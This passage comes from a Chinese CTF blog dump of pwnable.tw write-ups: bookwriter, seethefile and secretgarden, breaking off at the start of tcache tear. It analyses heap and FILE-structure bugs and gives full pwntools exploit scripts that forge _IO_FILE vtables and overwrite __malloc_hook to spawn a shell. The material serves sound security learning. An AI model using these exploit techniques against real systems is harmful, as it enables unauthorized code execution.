利用\n\n## 2.1 泄露堆地址和libc基址\n\n泄露堆地址和libc测试代码：\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n#获取unsorted bin中第一个bin的top值\n    myproc.recvuntil(\"yuan\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n#获取.bss段中author_name相邻的page指针，即堆地址\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n    \n#泄露堆地址\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")     #构造64字节name，后续打印name会越界打印出堆地址\nadd_page(0x18,\"b\"*0x18)      \nedit_page(0,\"c\"*0x18)    #计算size的时候会把top chunk的size字段也算进去，导致下一步可以多写3字节\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")    #将page0的内容改为空，则page0的size字段为空，可绕过add_page中对page[8]的检查。最后三个字节更改top chunk的大小，使其进入unsorted bin中，从而泄露top地址\nheap_addr = information(0,0)    #获取page[0]上的堆地址\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\n#泄露libc\nfor i in range(0,8):\n    add_page(0x64,\"a\"*4+\"yuan\")\ntop_addr = view_page(3)      # 除了第一个从unsorted bin中分配的堆块，无法获得top地址，其他都可\nlog.warn(\"top_addr: 0x%x\" % top_addr)\nlibc_base = top_addr - 0x58 - 0x3c3b20    #通过top地址，计算libc基址。0x58可以在堆调试中看到,0x3c3b20是查看libc.so中malloc_trim函数中变量的偏移获取到的。\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n## 2.2 get shell\n\n通过以上代码，已经可以实现往第0个堆上写超长数据，从而覆盖堆空间其他部分了。\n\n现在还需要解决几个问题：\n\n（1）通过unsortedbin attack将IO_list_all覆盖为我们可写的内存地址，从而伪造IO_FILE_plus结构体\n\n问题1：但是通过unsortedbin attack只能将IO_list_all覆盖为mainarena+0x58（64位），该空间是我们不可控的，且空间的条件内不满足执行_IO_OVERFLOW，因此会转去寻找chain这个地址。\n\n（2）此时chain的位置正好是small bin的区域，因此我们需要构造一个能控制的small bin chunk\n\n问题2：怎么获得这个可控制的small bin chunk呢？将unsorted bin chunk中的chunk大小改一下，改成small bin大小，这样从unsorted bin中拆下的chunk就会被链接到对应大小的small bin上。\n\n问题3：这个大小应该多大呢？根据（1）中chain的位置来确定，本题是0x60。\n\n### unsorted bin attack\n\n参考ctf-wiki：[unsorted bin attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)\n\n利用该方法可以往任意地址写一个固定的值。本题中可以将main_arena+0x58的地址写到IO_list_all上（将IO_list_all - 0x10的地址放在unsorted chunk的bk处），从而将IO_FILE_plus转移。由于main_arena不满足条件，会继续转移。IO_FILE中chain的位置正好在0x60大小small bin的bk处。如下图，构造一个0x60大小的unsorted bin，malloc时会将该unsorted bin放到chunk(IO_FILE)位置。而unsorted bin chunk的大部分区域我们都可以通过堆溢出来任意写。\n\n![](bookwriter-1.png)\n\n### I/O FILE\n\n以上分析可知，我们现在需要在unsorted bin chunk里布局IO_FILE_plus结构体，有一些限制条件，在参考链接中有提及，这里不复述。因此，通过堆溢出在第0号堆块上布局如下：\n\n![](bookwriter-2.png)\n\n按照如上构造后，在gef中调试打印如下：\n\n```shell\ngef➤  heap chunks\nChunk(addr=0x1c91010, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c91010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\ngef➤  x/50gx 0x1c91010+0x390\n0x1c913a0:\t0x0068732f6e69622f\t0x0000000000000061\n0x1c913b0:\t0x0000000000000000\t0x00007f9ecc967510\n0x1c913c0:\t0x0000000000000002\t0x0000000000000003\n0x1c913d0:\t0x0000000000000000\t0x0000000000000000\n0x1c913e0:\t0x0000000000000000\t0x0000000000000000\n0x1c913f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91400:\t0x0000000000000000\t0x0000000000000000\n0x1c91410:\t0x0000000000000000\t0x0000000000000000\n0x1c91420:\t0x0000000000000000\t0x0000000000000000\n0x1c91430:\t0x0000000000000000\t0x0000000000000000\n0x1c91440:\t0x0000000000000000\t0x0000000000000000\n0x1c91450:\t0x0000000000000000\t0x0000000000000000\n0x1c91460:\t0xffffffffffffffff\t0x0000000000000000\n0x1c91470:\t0x0000000000000000\t0x0000000001c91480\n0x1c91480:\t0x0000000000000000\t0x0000000000000000\n0x1c91490:\t0x0000000000000001\t0x00007f9ecc5e7390\n0x1c914a0:\t0x0000000000000000\t0x0000000000000000\n0x1c914b0:\t0x0000000000000000\t0x0000000000000000\n0x1c914c0:\t0x0000000000000000\t0x0000000000000000\n0x1c914d0:\t0x0000000000000000\t0x0000000000000000\n0x1c914e0:\t0x0000000000000000\t0x0000000000000000\n0x1c914f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91500:\t0x0000000000000000\t0x0000000000000000\n0x1c91510:\t0x0000000000000000\t0x0000000000000000\n0x1c91520:\t0x0000000000000000\t0x0000000000000000\ngef➤  p *(struct _IO_FILE_plus*)0x1c913a0\n$1 = {\n  file = {\n    _flags = 0x6e69622f, \n    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, \n    _IO_read_end = 0x0, \n    _IO_read_base = 0x7f9ecc967510 \"\", \n    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, \n    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, \n    _IO_write_end = 0x0, \n    _IO_buf_base = 0x0, \n    _IO_buf_end = 0x0, \n    _IO_save_base = 0x0, \n    _IO_backup_base = 0x0, \n    _IO_save_end = 0x0, \n    _markers = 0x0, \n    _chain = 0x0, \n    _fileno = 0x0, \n    _flags2 = 0x0, \n    _old_offset = 0x0, \n    _cur_column = 0x0, \n    _vtable_offset = 0x0, \n    _shortbuf = \"\", \n    _lock = 0x0, \n    _offset = 0x0, \n    _codecvt = 0x0, \n    _wide_data = 0x0, \n    _freeres_list = 0x0, \n    _freeres_buf = 0x0, \n    __pad5 = 0x0, \n    _mode = 0xffffffff, \n    _unused2 = \"\\377\\377\\377\\377\", '\\000' <repeats 15 times>\n  }, \n  vtable = 0x1c91480\n}\ngef➤  p *(struct _IO_jump_t*)0x1c91480\n$2 = {\n  __dummy = 0x0, \n  __dummy2 = 0x0, \n  __finish = 0x1, \n  __overflow = 0x7f9ecc5e7390 <__libc_system>, \n  __underflow = 0x0, \n  __uflow = 0x0, \n  __pbackfail = 0x0, \n  __xsputn = 0x0, \n  __xsgetn = 0x0, \n  __seekoff = 0x0, \n  __seekpos = 0x0, \n  __setbuf = 0x0, \n  __sync = 0x0, \n  __doallocate = 0x0, \n  __read = 0x0, \n  __write = 0x0, \n  __seek = 0x0, \n  __close = 0x0, \n  __stat = 0x0, \n  __showmanyc = 0x0, \n  __imbue = 0x0\n}\n```\n\n# 3 EXP\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=remote(\"chall.pwnable.tw\",10304)\n#myproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#mylibc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')\n#myproc=process(myelf.path)\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.recvuntil(\"aaaaaaaa\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")\nadd_page(0x18,\"b\"*0x18)\nedit_page(0,\"c\"*0x18)\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")\nheap_addr = information(0,0)\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\nfor i in range(0,8):\n    add_page(0x64,\"a\"*8)\n\ntop_addr = view_page(3)\nlog.warn(\"top_addr: 0x%x\" % top_addr)\n#yuancheng\nlibc_base = top_addr - 0x58 - 0x3c3b20\n#bendi\n#libc_base = top_addr - 0x58 - 0x3c4b20\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\nfakefile = \"/bin/sh\\0\" + p64(0x61) + p64(0) + p64(libc_base + mylibc.symbols['_IO_list_all']-0x10) + p64(2) + p64(3)\nfakefile += \"\\x00\"*0x90 + p64(0xffffffffffffffff) + \"\\x00\"*0x10 \nfakefile += p64(heap_addr + 0x390 + 0xe0)\n\nvtable = p64(0) + p64(0) + p64(1) + p64(libc_base + mylibc.symbols[\"system\"])\n\npayload = \"\\x00\"*0x390 + fakefile + vtable\nedit_page(0,payload)\n\nmyproc.recvuntil(\"Your choice :\")\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"Size of page :\")\nmyproc.sendline(str(0x10))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之seethefile","url":"/2020/03/29/seethefile/","content":"\n[题目链接](https://pwnable.tw/challenge/#9)\n\n# 1 分析\n\n```shell\n$ file seethefile \nseethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped\n$ checksec seethefile\n[*] '/mnt/hgfs/vmshare-1604/seethefile/seethefile'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n- 32位二进制可执行程序\n- 动态链接\n- got表可读可写\n- 栈不可执行，未开栈canary\n- 未随机化\n\n程序一共实现了五个功能：\n\n- open：打开文件\n\n- read：读文件\n\n- write to screen：将读取的内容打印到屏幕\n\n- close：关闭文件\n- exit：退出\n\n所有操作都是针对如下几个bss段的全局变量：\n\n- char filename[64]\n- char magicbuf[416]\n- name，占0x20个字节\n- FILE *fp\n\nopenfile读取字符串到filename[64]处，如果文件名不包含“flag”字符串就打开这个文件，并将文件描述符指针关联到bss段的FILE *fp。\n\nreadfile将打开文件的内容读取到magicbuf[416]。\n\nwrite to screen将magicbuf[416]中的内容打印到屏幕上。（filename不能包含“flag”，内容中不能包含\"FLAG\"或\"}\"）\n\nclose将打开的文件关闭。\n\nexit退出前会读取一段字符串到bss段的name处，然后判断fp是否为空，若不为空就fslose(fp)。如下代码：\n\n```c\n      case 5:\n        printf(\"Leave your name :\");\n        __isoc99_scanf(\"%s\", &name);\n        printf(\"Thank you %s ,see you next time\\n\", &name);\n        if ( fp )\n          fclose(fp);\n        exit(0);\n        return;\n```\n\n漏洞点：name和fp相邻，name处在低地址，fp处在高地址。scanf未限制name输入的字符串大小，导致溢出覆盖fp指针。\n\n触发代码：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\n#mylibc = ELF('./libc_32.so.6')\nmylibc = ELF(\"/lib32/libc-2.23.so\")\nmyproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\n#myproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\nclosefile()\ngdb.attach(myproc)\nexit('a'*50)\nmyproc.interactive()\n```\n\n执行以上出发代码，观察堆栈发现eax和esi都被输入的“a”字符给覆盖了。\n\n```shell\n$eax   : 0x61616161 (\"aaaa\"?)\n$ebx   : 0xf7f7a000  →  0x001afdb0\n$ecx   : 0xffffffff\n$edx   : 0xf7f7b870  →  0x00000000\n$esp   : 0xffe11f60  →  0xf7faa7eb  →   add esi, 0x15815\n$ebp   : 0xffe11f88  →  0xffe11fd8  →  0x00000000\n$esi   : 0x61616161 (\"aaaa\"?)\n$edi   : 0xf7f7a000  →  0x001afdb0\n$eip   : 0xf7e26ed7  →  <fclose+23> cmp BYTE PTR [esi+0x46], 0x0\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86\n```\n\n# 2 利用\n\n根据fclose的特性，参考了以下几篇文章：\n\n[pwnable.tw 9 seethefile ](https://blog.csdn.net/qq_42192672/article/details/84782627)\n\n[glibc fclose源代码阅读及伪造_IO_FILE利用fclose实现任意地址执行](https://www.jianshu.com/p/2e00afb01606)\n\n（1）_IO_FILE结构体大小为0x94\n\n（2）flags & 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp->vtabl->__finish(fp)\n\n（3）将fp指向一块内存P，P偏移0的前4字节设置为0xffffdfff，P偏移4位置放上要执行的字符串指令（字符串以';'开头即可），P偏移sizeof(_IO_FILE)大小位置（vtable）覆盖为内存区域Q，Q偏移2*4字节处(vtable->__finish)覆盖为system函数地址即可\n\n（4）vtable是个虚标指针，里面一般性是21or23个变量\n\nexp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\nmylibc = ELF('./libc_32.so.6')\n#mylibc = ELF(\"/lib32/libc-2.23.so\")\n#myproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\nmyproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\n#泄露libc\nopenfile(\"/proc/self/maps\")\nreadfile()\nprintfile()\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlibc_addr = int(myproc.recv(8),16) + 0x1000\nlog.warn(\"libc_addr : 0x%x\" % libc_addr)\nsys_addr = libc_addr + mylibc.symbols['system']\nlog.warn(\"sys_addr: 0x%x\" % sys_addr)\nclosefile()\n#覆盖函数指针\nopenfile('/proc/self/maps')\nFAKE_IO_FILE_addr = 0x0804b300\npayload = \"a\"*32 + p32(FAKE_IO_FILE_addr)\npayload += \"\\x00\"*(0x80-4)\npayload += \"\\xff\\xff\\xdf\\xff;sh\\x00\".ljust(0x94,'\\x00')\npayload += p32(FAKE_IO_FILE_addr + 0x98)\npayload += p32(sys_addr)*21\nexit(payload)\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n其他解题思路：\n\n[seethefile 解题思路](http://p4nda.top/2017/09/20/pwnable-tw-seethefile/)\n\n","categories":["CTF"]},{"title":"pwnable.tw之SecretGarden","url":"/2020/03/20/SecretGarden/","content":"\n[题目链接](https://pwnable.tw/challenge/#12)\n\n参考WP：\n\n[pwnable.tw中的secretgarden](https://www.lyyl.online/2019/09/27/pwnable-tw中的secretgarden/)\n\n[pwnable.tw 11~18题 writeup](https://veritas501.space/2018/03/04/pwnable.tw 11~18题 writeup/)\n\n[pwnable.tw-secretgarden](https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n两条命令查看给定二进制文件基本信息：\n\n```shell\n$ file secretgarden \nsecretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped\n\n$ checksec secretgarden \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/bling/.pwntools-cache-2.7/update to 'never'.\n[*] You have the latest version of Pwntools (4.0.1)\n[*] '/mnt/hgfs/vmshare-1604/secret_gargen/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\n以上信息可以得知：\n\n- 64位二进制可执行程序，动态链接，去符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化开启\n\n## 1.2 IDA逆向源码逻辑\n\n第一眼就看到了alarm函数，patch掉。\n\n```c\nvoid __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 choice_1; // [rsp+0h] [rbp-28h]\n  unsigned __int64 v4; // [rsp+8h] [rbp-20h]\n\n  v4 = __readfsqword(0x28u);\n  time_alarm();\n  while ( 1 )\n  {\n    print_info();\n    read(0, &choice_1, 4uLL);\n    switch ( (unsigned int)strtol((const char *)&choice_1, 0LL, 10) )\n    {\n      case 1u:\n        raise();                                // Raise a flower\n        break;\n      case 2u:\n        visit();                                // Visit the garden\n        break;\n      case 3u:\n        remove();                               // Remove a flower from the garden\n        break;\n      case 4u:\n        clean();                                // Clean the garden\n        break;\n      case 5u:\n        puts(\"See you next time.\");             // Leave the garden\n        exit(0);\n        return;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n}\n```\n\n源码一共实现了5个功能，分别是raise()，visit()，remove()， clean()，以及一个exit(0)退出函数。着重分析前三个函数功能。\n\n- raise()函数\n\n经过分析，raise()的功能主要是malloc一个堆块（flower_chunk），并将该堆块链接到bss段qword_202040（大小为100的数组），一共可以养100支花。如下图所示。\n\n![](secretgarden1.png)\n\n- visit()函数\n\n该函数会遍历bss段上全局变量qword_202040[100]中各个元素，并打印flower_chunk第一个元素为1的堆块内容（flower_chunk的第一个元素为1表明该flower处于raise状态，当remove后第一个元素会变为0）。\n\n- remove()函数\n\n该函数根据指定的数组下标，将对应的flower_chunk第一个元素置为0，并将第二个元素指向的堆块free掉。其中free代码如下：\n\n```c\nif ( v2 <= 99 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )\n  {\n    *v1 = 0;\n    free(*(void **)(qword_202040[v2] + 8LL));\n    result = puts(\"Successful\");\n  }\n```\n\n可以看到，本题的漏洞点就在这儿。free操作后，并没有将flower_chunk的第二个元素置NULL，导致一个悬空指针的产生。\n\n- clean()函数\n\n对delete过的节点，将其从bss段的qword_202040[100]中释放，并将qword_202040[100]相应元素置0。这个函数在我利用中没有用到。\n\n## 1.3 漏洞触发\n\n以double free的方式触发该漏洞，代码如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('40','f0','c0')\nRaise('40','f1','c1')\nRemove('0')\nRemove('0')\nmyproc.interactive()\n```\n\n执行后，出现如下错误提示信息：\n\n```shell\n[DEBUG] Received 0x5b bytes:\n    \"*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\\n\"\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\n```\n\n# 2 利用\n\n本题有一个double free的漏洞，并且有一个visit()函数可以打印flower_chunk的堆块内容。因此可以将libc中的某个地址泄露到flower_chunk堆块中，调用visit()函数进行打印，最后通过偏移计算libc基址。double free还可用于构造任意地址写，寻找合适的函数指针（如程序自带的函数指针，got表项，fini_array段函数指针或者libc中的函数指针）将其覆盖为system函数（并构造参数\"/bin/sh\\x00\"），或者直接调用one_gadget。\n\n- 泄露libc地址\n\n利用unsorted bin的特性。释放一个堆块到unsorted bin，然后又申请该大小的堆块，调用visit()打印flower_chunk中的name堆块其前0-8或8-16字节。\n\n在覆盖0-8字节时有两种办法：\n\n1）使用` sendline(\"a\"*7) `或`send(\"a\"*8) `\n\n2）使用`send(\"\")`\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\nlog.warn(\"top_addr:0x%x\" % top_addr)\nlog.warn(\"libc_addr:0x%x\" % libc_addr)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n- 覆盖函数指针\n\n经过分析，本题采用覆盖`libc函数指针+one_gadget`的方式进行利用。直接覆盖malloc函数的方式不可行，因为one_gadget都有constraints约束条件，如下代码所示。\n\n```shell\n$ one_gadget libc_64.so.6 \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xef6c4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf0567 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n堆里面有一种情况，就是free或者malloc出错时，会去调用`malloc_printerr`打印错误信息（如检测到double free时）。这个函数中会去调用malloc，此时的rsp+0x50可以满足上述约束条件。\n\n参考[gdb带源码调试libc](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/20/gdb/)方法获取执行到`__malloc_hook`时的约束条件。\n\n因此，选择将`__malloc_hook`函数指针覆盖为one_gadget地址。最后触发一次double free，进入`malloc_printerr`中调用`malloc`函数时会先执行`__malloc_hook`，于是one_gadget得到执行，成功get shell。\n\n# 3 EXP\n\n最终的exp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\n# log.warn(\"top_addr:0x%x\" % top_addr)\n# log.warn(\"libc_addr:0x%x\" % libc_addr)\n\nmalloc_hook = libc_addr + mylibc.symbols['__malloc_hook']\nfake_chunk = malloc_hook - 0x23\n# 根据__malloc_hook低地址的情况，__malloc_hook - 0x13处可以构造8字节0x000000000000007f作为fake_chunk的大小，此时fake_chunk的地址为__malloc_hook - 0x13 - 0x10\ngadget_addr = libc_addr + 0xf0567\n\nRaise('100','f0','c4')\nRaise('100','f1','c5')\nRemove('4')\nRemove('5')\nRemove('4')\nRaise('100',p64(fake_chunk),'c6')\nRaise('100','xx','c7')\nRaise('100','xx','c8')\nlog.warn('fake_chunk: 0x%x' % fake_chunk)\nlog.warn('malloc_hook: 0x%x' % malloc_hook)\nlog.warn('libc_addr: 0x%x' % libc_addr)\nlog.warn('gadget_addr: 0x%x' % gadget_addr)\n# hacked fastbin to fake_chunk\nRaise('100','a'*0x13 + p64(gadget_addr),'c9')\n# size 0x70 104\n# size 0x60 88\nRemove('8')\nRemove('8')\n#Visit()\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之tcache tear","url":"/2020/03/13/tcachetear/","content":"\n[Tcache tear题目链接](https://pwnable.tw/challenge/#33)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file tcache_tear\ntcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped\n\n$ checksec tcache_tear\n[*] '/mnt/hgfs/vmshare-1804/Tcache-tear/tcache_tear'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n```\n\n可以得到如下信息：\n\n- 